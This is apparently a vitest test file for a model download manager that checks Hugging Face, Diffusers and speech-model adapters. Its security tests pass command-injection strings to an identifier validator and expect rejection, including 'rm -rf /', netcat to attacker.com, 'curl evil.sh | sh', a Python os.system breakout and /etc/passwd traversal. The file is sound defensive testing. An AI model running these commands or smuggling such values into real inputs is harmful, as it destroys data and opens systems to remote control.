import { describe, it, expect } from 'vitest';
import {
  DiffusersDownloadAdapter,
  InvalidModelIdentifierError,
  assertSafeModelIdentifier,
  ModelDownloadManager,
  HuggingFaceDownloadAdapter,
} from '../src/model-download-manager.js';
import { ModelEntrySchema } from '@metroforge/schemas';
import { SpeechModelDownloadAdapter } from '../src/speech-model-download.js';

const diffusersModel = ModelEntrySchema.parse({
  id: 'sdxl-base-1.0',
  name: 'SDXL',
  provider: 'diffusers',
  repository: 'https://huggingface.co/stabilityai/stable-diffusion-xl-base-1.0',
  modality: 'image',
  capabilities: ['IMAGE_GENERATION'],
  local: true,
  enabled: true,
  costClass: 'free',
  license: 'OpenRAIL++-M',
  commercialUse: 'restricted',
  supportsImageGeneration: true,
  runtime: 'diffusers',
  downloadSizeMb: 6700,
  priority: 80,
  tags: [],
});

describe('DiffusersDownloadAdapter', () => {
  it('claims diffusers models', () => {
    const adapter = new DiffusersDownloadAdapter('/tmp/models');
    expect(adapter.canDownload(diffusersModel)).toBe(true);
  });

  it('HF adapter skips diffusers models', () => {
    const hf = new HuggingFaceDownloadAdapter('/tmp/models');
    expect(hf.canDownload(diffusersModel)).toBe(false);
  });
});

describe('assertSafeModelIdentifier — security', () => {
  it('accepts legitimate Hugging Face org/repo identifiers', () => {
    expect(() => assertSafeModelIdentifier('stabilityai/stable-diffusion-xl-base-1.0')).not.toThrow();
    expect(() => assertSafeModelIdentifier('meta-llama/Llama-3.1-8B-Instruct')).not.toThrow();
    expect(() => assertSafeModelIdentifier('gpt2')).not.toThrow();
  });

  it('rejects shell metacharacters (command injection attempt)', () => {
    expect(() => assertSafeModelIdentifier('repo; rm -rf /')).toThrow(InvalidModelIdentifierError);
    expect(() => assertSafeModelIdentifier('repo`whoami`')).toThrow(InvalidModelIdentifierError);
    expect(() => assertSafeModelIdentifier('repo$(whoami)')).toThrow(InvalidModelIdentifierError);
    expect(() => assertSafeModelIdentifier('repo|nc attacker.com 1234')).toThrow(InvalidModelIdentifierError);
    expect(() => assertSafeModelIdentifier('repo&& curl evil.sh | sh')).toThrow(InvalidModelIdentifierError);
  });

  it('rejects a Python string-literal breakout attempt', () => {
    expect(() =>
      assertSafeModelIdentifier(`x'); import os; os.system('rm -rf ~'); print('`),
    ).toThrow(InvalidModelIdentifierError);
  });

  it('rejects whitespace and newlines', () => {
    expect(() => assertSafeModelIdentifier('repo name')).toThrow(InvalidModelIdentifierError);
    expect(() => assertSafeModelIdentifier('repo\nname')).toThrow(InvalidModelIdentifierError);
  });

  it('rejects path traversal segments', () => {
    expect(() => assertSafeModelIdentifier('../../etc/passwd')).toThrow(InvalidModelIdentifierError);
    expect(() => assertSafeModelIdentifier('org/../../etc')).toThrow(InvalidModelIdentifierError);
  });

  it('rejects unexpected URL schemes', () => {
    expect(() => assertSafeModelIdentifier('file:///etc/passwd')).toThrow(InvalidModelIdentifierError);
    expect(() => assertSafeModelIdentifier('http://evil.example/payload')).toThrow(InvalidModelIdentifierError);
  });

  it('error message carries the MODEL_IDENTIFIER_INVALID code for typed-failure handling', () => {
    try {
      assertSafeModelIdentifier('bad;id');
      expect.unreachable();
    } catch (err) {
      expect(err).toBeInstanceOf(InvalidModelIdentifierError);
      expect((err as InvalidModelIdentifierError).code).toBe('MODEL_IDENTIFIER_INVALID');
      expect((err as Error).message).toContain('MODEL_IDENTIFIER_INVALID');
    }
  });
});

describe('download() validates the identifier before touching any subprocess', () => {
  it('HuggingFaceDownloadAdapter.download rejects a malicious repository before spawning anything', async () => {
    const hf = new HuggingFaceDownloadAdapter('/tmp/models');
    const malicious = ModelEntrySchema.parse({
      ...diffusersModel,
      id: 'malicious',
      provider: 'huggingface',
      repository: 'https://huggingface.co/org/repo; rm -rf /',
      runtime: undefined,
    });
    await expect(hf.download(malicious)).rejects.toThrow(InvalidModelIdentifierError);
  });

  it('DiffusersDownloadAdapter.download rejects a malicious repository before spawning anything', async () => {
    const diffusers = new DiffusersDownloadAdapter('/tmp/models');
    const malicious = ModelEntrySchema.parse({
      ...diffusersModel,
      id: 'malicious-diffusers',
      repository: `https://huggingface.co/x'); import os; os.system('id'); print('`,
    });
    await expect(diffusers.download(malicious)).rejects.toThrow(InvalidModelIdentifierError);
  });
});

describe('ModelDownloadManager speech models', () => {
  it('plans piper-en and whisper-base via speech-models adapter', () => {
    const dm = new ModelDownloadManager('/tmp/models');
    const piper = ModelEntrySchema.parse({
      id: 'piper-en',
      name: 'Piper',
      provider: 'piper',
      modality: 'speech',
      capabilities: ['SPEECH_GENERATION'],
      local: true,
      enabled: true,
      costClass: 'free',
      license: 'MIT',
      commercialUse: 'allowed',
      runtime: 'piper',
      downloadSizeMb: 63,
      priority: 70,
      tags: [],
    });

    const plan = dm.planDownload(piper);
    expect(plan.adapter).toBe('speech-models');
    expect(plan.targetPath.replace(/\\/g, '/')).toContain('speech/piper-en');

    const speech = new SpeechModelDownloadAdapter('/tmp/models');
    expect(speech.canDownload(piper)).toBe(true);
  });
});
